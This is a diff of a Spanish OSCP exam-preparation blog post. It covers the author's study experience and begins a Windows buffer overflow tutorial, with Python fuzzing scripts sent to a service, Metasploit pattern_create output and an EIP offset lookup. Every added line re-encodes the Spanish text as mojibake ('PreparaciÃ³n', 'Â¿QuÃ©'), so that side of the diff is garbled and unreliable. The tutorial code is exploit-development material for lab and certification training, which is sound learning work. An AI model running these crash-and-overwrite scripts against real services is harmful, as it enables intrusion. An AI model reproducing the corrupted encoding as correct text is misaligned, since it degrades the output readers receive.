@@ -1,7 +1,6 @@
----
-layout: single
-title: Preparación OSCP
-excerpt: "Para aquellos interesados en certificarse de OSCP, por aquí os dejo una guía hecha por mi donde de manera desglosada comentamos cada uno de los puntos importantes a tener en cuenta de cara a la examinación."
+﻿---
+title: PreparaciÃ³n OSCP
+excerpt: "Para aquellos interesados en certificarse de OSCP, por aquÃ­ os dejo una guÃ­a hecha por mi donde de manera desglosada comentamos cada uno de los puntos importantes a tener en cuenta de cara a la examinaciÃ³n."
 date: 2020-02-04
 classes: wide
 header:
@@ -14,24 +13,24 @@ tags:
   - Offensive Security
   - Pentesting
   - Examen
-  - Guías
+  - GuÃ­as
 ---
 
-# Preparación para el OSCP (by s4vitar)
+# PreparaciÃ³n para el OSCP (by s4vitar)
 
 ![OSCP Image](http://funkyimg.com/i/2MPB4.png)
 #### Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet
 
 <br>
-Esta guía es la misma que tengo publicada en mi Gist:
+Esta guÃ­a es la misma que tengo publicada en mi Gist:
 
 * [https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e](https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e)
 
-## Índice y Estructura Principal
+## Ãndice y Estructura Principal
 - [Antecedentes - Experiencia Personal](#Antecedentes)
 - [Buffer Overflow Windows (25 puntos)](#buffer-overflow-windows)
      * [Fuzzing](#fuzzing)
-     * [Calculando el Offset (Tamaño del Búffer)](#calculando-el-offset)
+     * [Calculando el Offset (TamaÃ±o del BÃºffer)](#calculando-el-offset)
      * [Controlando el registro EIP](#controlando-el-registro-eip)
      * [Situando y Asignando Espacio al Shellcode](#situando-y-asignando-espacio-al-shellcode)
      * [Detectando los Badchars](#detectando-los-badchars)
@@ -52,7 +51,7 @@ Esta guía es la misma que tengo publicada en mi Gist:
        * [Port Scanning](#port-scanning)
        * [Wfuzz](#Wfuzz)
        * [Nikto](#Nikto)
-       * [Enumeración SNMP](#snmp-enumeration)
+       * [EnumeraciÃ³n SNMP](#snmp-enumeration)
        * [Reverse Shell](#reverse-shell)
        * [Spawning a TTY Shell](#spawning-a-tty-shell)
        * [Compilado de Exploits para Windows](#compilado-de-exploits-para-windows)
@@ -86,15 +85,15 @@ Esta guía es la misma que tengo publicada en mi Gist:
         * [Port Knocking](#port-knocking)
      * [Pentesting Windows](#pentesting-windows)
         * [Transferencia de Archivos](#transferencia-de-archivos)
-        * [Evasión de Antivirus con Malware Genético](#av-evasion-genetic-malware)
-        * [Port Forwarding y Técnicas de Enrutamiento](#windows-port-forwarding)
+        * [EvasiÃ³n de Antivirus con Malware GenÃ©tico](#av-evasion-genetic-malware)
+        * [Port Forwarding y TÃ©cnicas de Enrutamiento](#windows-port-forwarding)
         * [Hashdump Manual](#hashdump-manual)
         * [PassTheHash](#passthehash)
         * [Enumeration & Privilege Escalation](#enumeration-and-privilege-escalation)
         * [Powershell Reverse Shell](#powershell-reverse-shell)
-        * [Migración manual a proceso a 64 bits](#manual-migration-process)
+        * [MigraciÃ³n manual a proceso a 64 bits](#manual-migration-process)
         * [RCE Filter Evasion Microsoft SQL](#rce-filter-evasion-microsoft-sql)
-        * [Conexión al Servicio Microsoft SQL con mssqclient.py de Impacket](#mssqlclient-impacket)
+        * [ConexiÃ³n al Servicio Microsoft SQL con mssqclient.py de Impacket](#mssqlclient-impacket)
         * [Reconocimiento del Sistema](#reconocimiento-del-sistema)
         * [Kernel Exploits Windows](#kernel-exploits-windows)
         * [Privilege Escalation Enumerations](#privilege-escalation-enumerations)
@@ -102,85 +101,85 @@ Esta guía es la misma que tengo publicada en mi Gist:
           
 Antecedentes
 ===============================================================================================================================
-Antes que nada me gustaría comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le sirva de inspiración para aquel que pretenda sacarse la certificación.
+Antes que nada me gustarÃ­a comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le sirva de inspiraciÃ³n para aquel que pretenda sacarse la certificaciÃ³n.
 
-#### ¿Es difícil la certificación?
+#### Â¿Es difÃ­cil la certificaciÃ³n?
 
-![Certificado Físico](http://funkyimg.com/i/2Ptt9.jpg)
+![Certificado FÃ­sico](http://funkyimg.com/i/2Ptt9.jpg)
 
-Diría que la respuesta es relativa, siempre va a depender de la soltura que tengas con máquinas de tipo _CTF/Challenge_. 
+DirÃ­a que la respuesta es relativa, siempre va a depender de la soltura que tengas con mÃ¡quinas de tipo _CTF/Challenge_. 
 
-A mi por ejemplo la plataforma **HackTheBox** me ha servido de mucho para coger todo el fondo que tengo a día de hoy, así como **VulnHub** u **OverTheWire**. De hecho, lo que más me sorprendió a la hora de ir haciendo las máquinas del laboratorio fue la gran similitud con las máquinas de HackTheBox. Hablando en términos comparativos, os puedo decir que efectivamente corresponden a las de nivel medio de HTB, tal y como llegué a leer en su momento en algunos artículos de gente que había pasado con éxito la certificación.
+A mi por ejemplo la plataforma **HackTheBox** me ha servido de mucho para coger todo el fondo que tengo a dÃ­a de hoy, asÃ­ como **VulnHub** u **OverTheWire**. De hecho, lo que mÃ¡s me sorprendiÃ³ a la hora de ir haciendo las mÃ¡quinas del laboratorio fue la gran similitud con las mÃ¡quinas de HackTheBox. Hablando en tÃ©rminos comparativos, os puedo decir que efectivamente corresponden a las de nivel medio de HTB, tal y como lleguÃ© a leer en su momento en algunos artÃ­culos de gente que habÃ­a pasado con Ã©xito la certificaciÃ³n.
 
-Eso si, la certificación fue dura, de las más duras que he hecho en mi vida, con mis momentos de desesperación en los que no llegaba a ver las cosas claras, sobre todo por la nueva modalidad **Proctored**, que quieras o no pone un poco nervioso. Mi consejo en este punto es que no tires nunca la toalla, ni aunque quede 1 hora de examen. De hecho, fue justamente 2 horas antes de acabar el examen cuando lo iba a dar todo por perdido hasta que se me ocurrió un vector de ataque que milagrosamente funcionó y logré explotar con éxito comprometiendo otro de los sistemas de la red (con escalada de privilegios incluido).
+Eso si, la certificaciÃ³n fue dura, de las mÃ¡s duras que he hecho en mi vida, con mis momentos de desesperaciÃ³n en los que no llegaba a ver las cosas claras, sobre todo por la nueva modalidad **Proctored**, que quieras o no pone un poco nervioso. Mi consejo en este punto es que no tires nunca la toalla, ni aunque quede 1 hora de examen. De hecho, fue justamente 2 horas antes de acabar el examen cuando lo iba a dar todo por perdido hasta que se me ocurriÃ³ un vector de ataque que milagrosamente funcionÃ³ y logrÃ© explotar con Ã©xito comprometiendo otro de los sistemas de la red (con escalada de privilegios incluido).
 
-Para que te quedes tranquilo, si juegas mucho con máquinas de tipo CTF y te entrenas día a día con retos desafiantes que te hagan pensar, no tienes de qué preocuparte.
+Para que te quedes tranquilo, si juegas mucho con mÃ¡quinas de tipo CTF y te entrenas dÃ­a a dÃ­a con retos desafiantes que te hagan pensar, no tienes de quÃ© preocuparte.
 
-#### ¿Qué plan me pillo?
+#### Â¿QuÃ© plan me pillo?
 
-En mi caso me llegué a pillar el plan de 3 meses, lo que se resume en unos 1.100 euros practicamente. 
+En mi caso me lleguÃ© a pillar el plan de 3 meses, lo que se resume en unos 1.100 euros practicamente. 
 
-Os puedo decir que en 1 mes ya tenía casi todas las máquinas hechas menos 4 de ellas que me siguieron quedando pendientes y no llegué a hacer (Eran las más Hard y vi que escapaban demasiado de la metodología del examen).
+Os puedo decir que en 1 mes ya tenÃ­a casi todas las mÃ¡quinas hechas menos 4 de ellas que me siguieron quedando pendientes y no lleguÃ© a hacer (Eran las mÃ¡s Hard y vi que escapaban demasiado de la metodologÃ­a del examen).
 
-El segundo mes lo utilicé para seguir con HackTheBox así como para repasar las máquinas hechas y probar vías alternativas de resolver las mismas.
+El segundo mes lo utilicÃ© para seguir con HackTheBox asÃ­ como para repasar las mÃ¡quinas hechas y probar vÃ­as alternativas de resolver las mismas.
 
-En base a cómo lo he vivido yo, os recomendaría más bien 2 meses de laboratorio, sobre todo por lo que me comentaba un gran compañero **Julio Ureña**, de que uno tiende a relajarse cuando tiene mucho tiempo por delante.
+En base a cÃ³mo lo he vivido yo, os recomendarÃ­a mÃ¡s bien 2 meses de laboratorio, sobre todo por lo que me comentaba un gran compaÃ±ero **Julio UreÃ±a**, de que uno tiende a relajarse cuando tiene mucho tiempo por delante.
 
-#### ¿Qué bases tuve antes de comenzar con la certificación?
+#### Â¿QuÃ© bases tuve antes de comenzar con la certificaciÃ³n?
 
-A nivel de Pentesting, en VulnHub tenía 30 máquinas, en OverTheWire 6 de los retos principales y en HackTheBox 55 máquinas con permisos de administrador en cada una de ellas.
+A nivel de Pentesting, en VulnHub tenÃ­a 30 mÃ¡quinas, en OverTheWire 6 de los retos principales y en HackTheBox 55 mÃ¡quinas con permisos de administrador en cada una de ellas.
 
-A nivel de Sistemas y programación, con muy buenas bases de Linux Avanzado, programación en Bash Avanzado y ligero tanto de Windows como de Python. Sí que es cierto que la certificación me hizo meterme más a fondo con Windows, así como con la programación en Python, de ahí me motivé de hecho para hacer la herramienta **spoofMe** para el Spoofing de llamadas y mensajería instantánea. 
+A nivel de Sistemas y programaciÃ³n, con muy buenas bases de Linux Avanzado, programaciÃ³n en Bash Avanzado y ligero tanto de Windows como de Python. SÃ­ que es cierto que la certificaciÃ³n me hizo meterme mÃ¡s a fondo con Windows, asÃ­ como con la programaciÃ³n en Python, de ahÃ­ me motivÃ© de hecho para hacer la herramienta **spoofMe** para el Spoofing de llamadas y mensajerÃ­a instantÃ¡nea. 
 
-A su vez a esto le sumo las auditorías reales de empresa que hago como Pentester en EnigmaSec, donde el hecho de practicar también en entornos reales me hace ver las cosas desde otra perspectiva.
+A su vez a esto le sumo las auditorÃ­as reales de empresa que hago como Pentester en EnigmaSec, donde el hecho de practicar tambiÃ©n en entornos reales me hace ver las cosas desde otra perspectiva.
 
-Por último, a nivel de Búffer Overflow, no sabía hacer nada... entré con la mente en blanco a la certificación. Sin embargo, en 4 días ya sabía hacer todos los ejercicios del laboratorio en base a la guía y a los vídeos de apoyo con los que cuentas en el material que te dan.
+Por Ãºltimo, a nivel de BÃºffer Overflow, no sabÃ­a hacer nada... entrÃ© con la mente en blanco a la certificaciÃ³n. Sin embargo, en 4 dÃ­as ya sabÃ­a hacer todos los ejercicios del laboratorio en base a la guÃ­a y a los vÃ­deos de apoyo con los que cuentas en el material que te dan.
 
-#### ¿Qué horarios de estudio seguías?
+#### Â¿QuÃ© horarios de estudio seguÃ­as?
 
-Esto tal vez ha sido lo más mortal, desafiante, doloroso pero a su vez fructífero. Estuve aplicando **Uberman** durante los 3 meses de preparación, una técnica de sueño polifásico que hace que con tan sólo dormir 3 horas seguidas aplicando posteriormente descansos de 20 minutos a intervalos regulares de tiempo puedas estar activo y despierto (Que no falten los que me conocen de cerca y me llamaban loco).
+Esto tal vez ha sido lo mÃ¡s mortal, desafiante, doloroso pero a su vez fructÃ­fero. Estuve aplicando **Uberman** durante los 3 meses de preparaciÃ³n, una tÃ©cnica de sueÃ±o polifÃ¡sico que hace que con tan sÃ³lo dormir 3 horas seguidas aplicando posteriormente descansos de 20 minutos a intervalos regulares de tiempo puedas estar activo y despierto (Que no falten los que me conocen de cerca y me llamaban loco).
 
-Decidí aplicarlo porque básicamente el día se pasaba muy rápido, cuando uno está trabajando tiene prioridades y debe anteponer las tareas y proyectos frente a lo demás. Para poder dedicarle tiempo de estudio al laboratorio, estuve sobre todo el primer mes aplicando a fondo la técnica, estudiando y practicando aproximadamente desde las 7 de la tarde hasta las 5 de la mañana.
+DecidÃ­ aplicarlo porque bÃ¡sicamente el dÃ­a se pasaba muy rÃ¡pido, cuando uno estÃ¡ trabajando tiene prioridades y debe anteponer las tareas y proyectos frente a lo demÃ¡s. Para poder dedicarle tiempo de estudio al laboratorio, estuve sobre todo el primer mes aplicando a fondo la tÃ©cnica, estudiando y practicando aproximadamente desde las 7 de la tarde hasta las 5 de la maÃ±ana.
 
-He de decir que también es un gran puñado de motivación lo que hace que estés dispuesto a hacer esto, en caso contrario ni lo habría intentado. Aún así no lo recomiendo hacer, pues es perjudicial para la salud, pero dependerá de cada cual como pretenda organizarse sus horas de estudio.
+He de decir que tambiÃ©n es un gran puÃ±ado de motivaciÃ³n lo que hace que estÃ©s dispuesto a hacer esto, en caso contrario ni lo habrÃ­a intentado. AÃºn asÃ­ no lo recomiendo hacer, pues es perjudicial para la salud, pero dependerÃ¡ de cada cual como pretenda organizarse sus horas de estudio.
 
-#### ¿Qué pasos me recomiendas para abordar con éxito la certificación?
+#### Â¿QuÃ© pasos me recomiendas para abordar con Ã©xito la certificaciÃ³n?
 
-En primer lugar hacerte una cuenta de **HackTheBox**, incluso te diría de pagarte la cuenta VIP para tener acceso a las máquinas retiradas. Tienes a tu disposición canales en Youtube como el de **ippsec**, que te explica paso a paso todas las máquinas retiradas con técnicas bastante chulas tanto de explotación en Windows como en Linux.
+En primer lugar hacerte una cuenta de **HackTheBox**, incluso te dirÃ­a de pagarte la cuenta VIP para tener acceso a las mÃ¡quinas retiradas. Tienes a tu disposiciÃ³n canales en Youtube como el de **ippsec**, que te explica paso a paso todas las mÃ¡quinas retiradas con tÃ©cnicas bastante chulas tanto de explotaciÃ³n en Windows como en Linux.
 
-Te recomiendo practicar en este tipo de entornos todo lo que puedas, pues son los que te harán ver una vez comiences con el laboratorio que hay bastante similitud y que no es tan costoso. Para las máquinas del laboratorio, te darás cuenta de que los entornos están un poco "deprecated", en el sentido de que son máquinas algo antiguas con arquitectura de 32 bits. A la hora de abordar estas máquinas, mi consejo es que no trates de explotarlas haciendo uso de exploits modernos, pues están pensadas para que practiques distintas vías de explotación con técnicas no tan actuales, lo que hace que ganes más fondo.
+Te recomiendo practicar en este tipo de entornos todo lo que puedas, pues son los que te harÃ¡n ver una vez comiences con el laboratorio que hay bastante similitud y que no es tan costoso. Para las mÃ¡quinas del laboratorio, te darÃ¡s cuenta de que los entornos estÃ¡n un poco "deprecated", en el sentido de que son mÃ¡quinas algo antiguas con arquitectura de 32 bits. A la hora de abordar estas mÃ¡quinas, mi consejo es que no trates de explotarlas haciendo uso de exploits modernos, pues estÃ¡n pensadas para que practiques distintas vÃ­as de explotaciÃ³n con tÃ©cnicas no tan actuales, lo que hace que ganes mÃ¡s fondo.
 
-#### ¿Qué es lo más duro de la certificación?
+#### Â¿QuÃ© es lo mÃ¡s duro de la certificaciÃ³n?
 
-La gestión del tiempo. Mi recomendación y por lo que he escuchado de los demás y coincido, es empezar con el Búffer Overflow a la hora de abordar el examen. Teniendo cierta soltura no te debería de llevar más de 1 hora.
+La gestiÃ³n del tiempo. Mi recomendaciÃ³n y por lo que he escuchado de los demÃ¡s y coincido, es empezar con el BÃºffer Overflow a la hora de abordar el examen. Teniendo cierta soltura no te deberÃ­a de llevar mÃ¡s de 1 hora.
 
-Una vez hecho, ya cuentas con 25 puntos del examen. El siguiente paso es saltar a la máquina de 10 puntos, suele ser una explotación rápida y directa como administrador del sistema. Con estos 35 puntos bajo la manga, lo más recomendable es dedicarle un buen tiempo a la otra máquina de 25 puntos, pues en caso de sacarla, estarías a 60 puntos y con conseguir el User de alguno de los otros 2 sistemas de 20 puntos ya estarías aprobado (Intenta aspirar a más y hazlas todas :P).
+Una vez hecho, ya cuentas con 25 puntos del examen. El siguiente paso es saltar a la mÃ¡quina de 10 puntos, suele ser una explotaciÃ³n rÃ¡pida y directa como administrador del sistema. Con estos 35 puntos bajo la manga, lo mÃ¡s recomendable es dedicarle un buen tiempo a la otra mÃ¡quina de 25 puntos, pues en caso de sacarla, estarÃ­as a 60 puntos y con conseguir el User de alguno de los otros 2 sistemas de 20 puntos ya estarÃ­as aprobado (Intenta aspirar a mÃ¡s y hazlas todas :P).
 
-En cuanto al laboratorio, es justamente el entorno deprecated lo que hace un poco tediosa la compilación y ejecución de exploits, pues en la mayoría de las veces te dará una petada de las importantes. Pero no te frustres, siempre con un poco de café y buena actitud se saca.
+En cuanto al laboratorio, es justamente el entorno deprecated lo que hace un poco tediosa la compilaciÃ³n y ejecuciÃ³n de exploits, pues en la mayorÃ­a de las veces te darÃ¡ una petada de las importantes. Pero no te frustres, siempre con un poco de cafÃ© y buena actitud se saca.
 
-#### ¿Cuáles son los siguientes pasos?
+#### Â¿CuÃ¡les son los siguientes pasos?
 
-Como siempre, uno nunca debe dejar de hacer lo que le gusta... y aún me queda un puñado de cosas por aprender. Será cuestión de seguir aprendiendo lo que hará que aparezca una respuesta a esta pregunta.
+Como siempre, uno nunca debe dejar de hacer lo que le gusta... y aÃºn me queda un puÃ±ado de cosas por aprender. SerÃ¡ cuestiÃ³n de seguir aprendiendo lo que harÃ¡ que aparezca una respuesta a esta pregunta.
 
-Sin más, ¡os dejo con toda la preparación del curso!
+Sin mÃ¡s, Â¡os dejo con toda la preparaciÃ³n del curso!
 
 
 Buffer Overflow Windows
 ===============================================================================================================================
-A continuación, se listan los pasos a seguir para la correcta explotación del Buffer Overflow en Windows (32 bits). Para la examinación, no se requieren de conocimientos avanzados de exploiting en BoF (bypassing ASLR, etc.), basta con practicar con servicios básicos y llevar esa misma metodología al examen.
+A continuaciÃ³n, se listan los pasos a seguir para la correcta explotaciÃ³n del Buffer Overflow en Windows (32 bits). Para la examinaciÃ³n, no se requieren de conocimientos avanzados de exploiting en BoF (bypassing ASLR, etc.), basta con practicar con servicios bÃ¡sicos y llevar esa misma metodologÃ­a al examen.
 
-Servicios/Máquinas con los que practicar:
+Servicios/MÃ¡quinas con los que practicar:
 
 -   SLMail 5.5 
 -   Minishare 1.4.1
--   Máquina Brainpan de VulnHub
--   Los 2 binarios personalizados compartidos en la máquina Windows personal del laboratorio
+-   MÃ¡quina Brainpan de VulnHub
+-   Los 2 binarios personalizados compartidos en la mÃ¡quina Windows personal del laboratorio
 
-Generalmente, la metodología a seguir es la que se describe a continuación.
+Generalmente, la metodologÃ­a a seguir es la que se describe a continuaciÃ³n.
 
 #### Fuzzing
 
-Para esta fase, es necesario en primer lugar identificar el campo en el que se produce el buffer overflow. Para un caso práctico, suponiendo por ejemplo que un servicio sobre un Host 192.168.1.45 corre bajo el puerto 4000 y que tras la conexión vía TELNET desde nuestra máquina, se nos solicita un campo USER a introducir, podemos elaborar el siguiente script en python con el objetivo de determinar si se produce un desbordamiento de búffer:
+Para esta fase, es necesario en primer lugar identificar el campo en el que se produce el buffer overflow. Para un caso prÃ¡ctico, suponiendo por ejemplo que un servicio sobre un Host 192.168.1.45 corre bajo el puerto 4000 y que tras la conexiÃ³n vÃ­a TELNET desde nuestra mÃ¡quina, se nos solicita un campo USER a introducir, podemos elaborar el siguiente script en python con el objetivo de determinar si se produce un desbordamiento de bÃºffer:
 
 ```python
 #!/usr/bin/python
@@ -189,7 +188,7 @@ Para esta fase, es necesario en primer lugar identificar el campo en el que se p
 import sys,socket
 
 if len(sys.argv) != 2:
-  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
   sys.exit(0)
 
 buffer = ["A"]
@@ -212,21 +211,21 @@ for strings in buffer:
     s.recv(1024)
     s.close()
   except:
-    print "\nError de conexión...\n"
+    print "\nError de conexiÃ³n...\n"
     sys.exit(0)
 
 ```
-De esta forma, a través de una lista, vamos almacenando en la variable **buffer** el caracter "A" un total 30 veces con un incremento para cada una de las iteraciones en 200. 
+De esta forma, a travÃ©s de una lista, vamos almacenando en la variable **buffer** el caracter "A" un total 30 veces con un incremento para cada una de las iteraciones en 200. 
 
 Esto es:
 
 **[1 caracter "A", 100 caracteres "A", 300 caracteres "A", 500 caracteres "A", 700 caracteres "A", ...]**
 
-Mientras tanto, desde _Immunity Debugger_, estando previamente sincronizados con el proceso, deberemos de utilizarlo como debugger para ver en qué momento se produce una violación de segmento.
+Mientras tanto, desde _Immunity Debugger_, estando previamente sincronizados con el proceso, deberemos de utilizarlo como debugger para ver en quÃ© momento se produce una violaciÃ³n de segmento.
 
-Cuando esto ocurra, deberíamos ver como el registro **EIP** toma el valor (**41414141**), correspondiente al caracter "A" en hexadecimal.
+Cuando esto ocurra, deberÃ­amos ver como el registro **EIP** toma el valor (**41414141**), correspondiente al caracter "A" en hexadecimal.
 
-Lo bueno de haber creado la lista, es que podemos identificar rápidamente entre qué valores se produce el Búffer Overflow, en otras palabras, si vemos que tras la ejecución de nuestro script en Python el último reporte que se hizo fue **"Enviando 700 bytes..."**, lo conveniente es modificar nuestro script al siguiente contenido:
+Lo bueno de haber creado la lista, es que podemos identificar rÃ¡pidamente entre quÃ© valores se produce el BÃºffer Overflow, en otras palabras, si vemos que tras la ejecuciÃ³n de nuestro script en Python el Ãºltimo reporte que se hizo fue **"Enviando 700 bytes..."**, lo conveniente es modificar nuestro script al siguiente contenido:
 
 ```python
 #!/usr/bin/python
@@ -235,7 +234,7 @@ Lo bueno de haber creado la lista, es que podemos identificar rápidamente entre
 import sys,socket
 
 if len(sys.argv) != 2:
-  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
   sys.exit(0)
 
 buffer = "A"*900
@@ -244,7 +243,7 @@ ipAddress = sys.argv[1]
 port = 4000
 
 try:
-  print "Enviando búffer..."
+  print "Enviando bÃºffer..."
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ipAddress, port))
   s.recv(1024)
@@ -252,19 +251,19 @@ try:
   s.recv(1024)
   s.close()
 except:
-  print "\nError de conexión...\n"
+  print "\nError de conexiÃ³n...\n"
   sys.exit(0)
 
 ```
-Siempre para asegurar es mejor mandarle los 200 caracteres siguientes de nuestro reporte. Tras la ejecución de esta variante, **Immunity Debugger** directamente nos debería reportar la violación de segmento con el valor **41414141** en el registro **EIP**, lo cual hace que ya tengamos una aproximación de tamaño del buffer permitido.
+Siempre para asegurar es mejor mandarle los 200 caracteres siguientes de nuestro reporte. Tras la ejecuciÃ³n de esta variante, **Immunity Debugger** directamente nos deberÃ­a reportar la violaciÃ³n de segmento con el valor **41414141** en el registro **EIP**, lo cual hace que ya tengamos una aproximaciÃ³n de tamaÃ±o del buffer permitido.
 
-Para que te quedes tranquilo, en el examen te entregarán un script en Python a modo de PoC donde se aplica un desbordamiento de búffer sobre el servicio. Contando con esto, es simplemente ir haciendo los pasos que se enumeran a continuación.
+Para que te quedes tranquilo, en el examen te entregarÃ¡n un script en Python a modo de PoC donde se aplica un desbordamiento de bÃºffer sobre el servicio. Contando con esto, es simplemente ir haciendo los pasos que se enumeran a continuaciÃ³n.
 
 #### Calculando el Offset
 
-Dado que el valor 414141 para el EIP no es algo descriptivo que nos permita hacernos la idea de qué tamaño tiene el buffer permitido, lo que hacemos es aprovecharnos de las utilidades **pattern_create** y **pattern_offset** de Metasploit.
+Dado que el valor 414141 para el EIP no es algo descriptivo que nos permita hacernos la idea de quÃ© tamaÃ±o tiene el buffer permitido, lo que hacemos es aprovecharnos de las utilidades **pattern_create** y **pattern_offset** de Metasploit.
 
-La funcionalidad **pattern_create** nos permitirá generar un puñado de caracteres aleatorios en base a una longitud fijada como criterio. 
+La funcionalidad **pattern_create** nos permitirÃ¡ generar un puÃ±ado de caracteres aleatorios en base a una longitud fijada como criterio. 
 
 Ejemplo:
 
@@ -274,7 +273,7 @@ $~ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9
 ```
 
-Para el ejemplo mostrado, hemos generado 900 bytes de caracteres aleatorios, lo único que tendríamos que hacer es sustituir el caracter "A" de nuestra variable _buffer_ por el contenido que **pattern_create** nos ha devuelto:
+Para el ejemplo mostrado, hemos generado 900 bytes de caracteres aleatorios, lo Ãºnico que tendrÃ­amos que hacer es sustituir el caracter "A" de nuestra variable _buffer_ por el contenido que **pattern_create** nos ha devuelto:
 
 ```python
 #!/usr/bin/python
@@ -283,7 +282,7 @@ Para el ejemplo mostrado, hemos generado 900 bytes de caracteres aleatorios, lo 
 import sys,socket
 
 if len(sys.argv) != 2:
-  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
   sys.exit(0)
 
 buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"
@@ -293,7 +292,7 @@ ipAddress = sys.argv[1]
 port = 4000
 
 try:
-  print "Enviando búffer..."
+  print "Enviando bÃºffer..."
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ipAddress, port))
   s.recv(1024)
@@ -301,18 +300,18 @@ try:
   s.recv(1024)
   s.close()
 except:
-  print "\nError de conexión...\n"
+  print "\nError de conexiÃ³n...\n"
   sys.exit(0)
 
 ```
 
-Lo que conseguimos con esto es determinar a través del valor del registro **EIP** desde **Immunity Debugger** una vez se produce la violación de segmento, qué caracteres están sobreescribiendo dicho registro.
+Lo que conseguimos con esto es determinar a travÃ©s del valor del registro **EIP** desde **Immunity Debugger** una vez se produce la violaciÃ³n de segmento, quÃ© caracteres estÃ¡n sobreescribiendo dicho registro.
 
-Supongamos que el registro **EIP** toma este valor tras la detención del servicio una vez producido el desbordamiento:
+Supongamos que el registro **EIP** toma este valor tras la detenciÃ³n del servicio una vez producido el desbordamiento:
 
 **EIP -> 39426230**
 
-A fin de realizar su traducción y ver qué caracteres de nuestro búffer corresponden a estos valores, podemos aplicar el siguiente comando desde terminal:
+A fin de realizar su traducciÃ³n y ver quÃ© caracteres de nuestro bÃºffer corresponden a estos valores, podemos aplicar el siguiente comando desde terminal:
 
 ```bash
 $~ echo "\0x39\0x42\0x62\0x30" | xxd -ps -r
